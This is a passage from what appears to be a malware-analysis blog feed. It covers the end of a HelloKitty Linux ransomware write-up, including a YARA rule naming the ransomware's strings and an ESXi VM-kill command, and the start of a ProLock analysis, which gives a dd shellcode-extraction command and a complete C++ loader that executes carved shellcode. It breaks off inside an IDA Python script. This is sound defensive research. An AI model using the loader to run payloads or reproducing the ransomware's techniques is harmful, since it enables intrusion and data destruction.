	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// Size of the sig | offset 0xa0 - 0xa4&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//  Sig | offset 0xa4 - 0xf0&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_structure01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Finally it writes to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .README_TO_RESTORE&lt;/code&gt; the ransomware note, then it append the previous structure at the end of the file.
It also append the SHA256 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;original file content + appended data&amp;gt;&lt;/code&gt; (see next)
Example:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717180830.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.README_TO_RESTORE&lt;/code&gt; file tail, showcasing the above structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(custom_structure01)&lt;/code&gt; and the SHA256 hash of the file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It then appended the same structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(custom_structure01)&lt;/code&gt; to the target file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717180410.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Original content of the file + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(custom_structure01)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally it reads the data of the target file and uses the file encryption &lt;strong&gt;AES key&lt;/strong&gt; to encrypt it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717162254.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Malware encrypt the content of the target file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717180607.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: File encrypted&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally it append again the structure + the sha256 of the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717180702.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Figure: Encrypted file + custom_structure01 + sha256&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This linux variant can target Virtual machines files, which can be crucial to companies without backup and replication.&lt;/p&gt;

&lt;p&gt;The encryption scheme used utilize ECDH (Elliptic-curve Diffie–Hellman) algorithm, which means without the private key owned by the threat actor, it will be near impossible to decrypt the encrypted files.&lt;/p&gt;

&lt;h2 id=&quot;yara-rule&quot;&gt;YARA Rule&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule hellokitty_linux {
    meta:
        description = &quot;YARA rule HelloKitty linux variant ransomware&quot;
        reference = &quot;https://soolidsnake.github.io/2021/07/17/hellokitty_linux.html&quot;
        author = &quot;@soolidsnakee&quot;
        date = &quot;2021-07-17&quot;
    strings:
        $str1 = &quot;Your files have been encrypted and attackers exfiltrated over&quot;
        $str2 = &quot;%s:%.2f GB in %.2f sec. %.4f GB&quot;
        $str3 = &quot;progress %s:%.2f GB&quot;
        $str4 = &quot;e:%d l:%d f:%s&quot;
        $str5 = &quot;switch to daemon&quot;
        $str6 = &quot;esxcli vm process kill -t=hard -w=%d&quot;
        $str7 = &quot;work.log&quot;
        $str8 = &quot;m:vdekc:&quot;
    condition:
        all of ($str*)
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">ProLock malware analysis</title><link href="http://localhost:4000/2020/05/11/Prolock_ransomware.html" rel="alternate" type="text/html" title="ProLock malware analysis" /><published>2020-05-11T12:08:00-05:00</published><updated>2020-05-11T12:08:00-05:00</updated><id>http://localhost:4000/2020/05/11/Prolock_ransomware</id><content type="html" xml:base="http://localhost:4000/2020/05/11/Prolock_ransomware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Prolock caught my attention after reading the &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/pwndlocker-fixes-crypto-bug-rebrands-as-prolock-ransomware/&quot;&gt;blogpost of bleepingcomputer&lt;/a&gt;, so I fired up my malware analysis box for some fun.&lt;/p&gt;

&lt;p&gt;Quick note: for your information, I did not analyse the crypto part of this ransomware.&lt;/p&gt;

&lt;h3 id=&quot;samples&quot;&gt;Samples&lt;/h3&gt;

&lt;p&gt;The sample can be downloaded from &lt;a href=&quot;https://app.any.run/tasks/3aa7cf15-aef1-409b-ae7e-d3a9e70c798d/&quot;&gt;app.any.run&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;c-loader&quot;&gt;C++ Loader&lt;/h3&gt;

&lt;p&gt;Reading the following powershell script&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.bleepstatic.com/images/news/ransomware/p/ProLock/powershell-script.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can see that the shellcode starts at address &lt;strong&gt;0xD7A0&lt;/strong&gt;, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd  skip=55200 of=shellcode if=Winmgr.bmp bs=1&lt;/code&gt; we can extract the shellcode and load it in memory to execute it, I wrote a simple C++ loader.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;conio.h&amp;gt;
#include &amp;lt;tchar.h&amp;gt;
#include &amp;lt;psapi.h&amp;gt;
&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#define BUF_SIZE 256
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;szName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Global&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;MyFileMappingObject&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shellcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_EXECUTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_SHARE_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreatedFile failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hMapFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hMapFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreateFileMapping failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MapViewOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hMapFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;FILE_MAP_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILE_MAP_EXECUTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILE_MAP_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreateFileMapping failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmodule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleHandleA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ntdll.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;MODULEINFO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmodule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MODULEINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GetModuleInformation failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpBaseOfDll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;VirtualProtect failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;dynamic-analyses&quot;&gt;Dynamic analyses&lt;/h3&gt;

&lt;p&gt;The ransomware code starts with a loop that decrypts the rest of the code, we can just set a hardware breakpoint at offset &lt;strong&gt;0x36&lt;/strong&gt; and let the loop do the job.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img0.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then with IDA we can use the key &lt;strong&gt;p&lt;/strong&gt; to analyse the code starting from offset &lt;strong&gt;0x6B&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img1.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reading the first assembly instructions we can see that the malware is parsing kernel32 to find some functions which are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;LoadLibraryA&lt;/li&gt;
  &lt;li&gt;GetProcAddress&lt;/li&gt;
  &lt;li&gt;VirtualAlloc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then it loads libraries &lt;strong&gt;shell32.dll&lt;/strong&gt; and &lt;strong&gt;netapi32.dll&lt;/strong&gt;. After that, the malware populates an array of function at an address allocated earlier. from there all library functions calls will be made using the array of function, example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call qword ptr [r15 + offset_of_function]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/prolock_ransom/img2.jpeg&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I wrote a simple IDA python to comment each call instruction with the name of the function that will be called:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idautils&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetFunctionAttr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_reg_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FUNCATTR_START&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;were&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;single&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stepping&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ins&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idautils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FuncItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Looping&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembly&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idaapi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
      &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetDisasm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
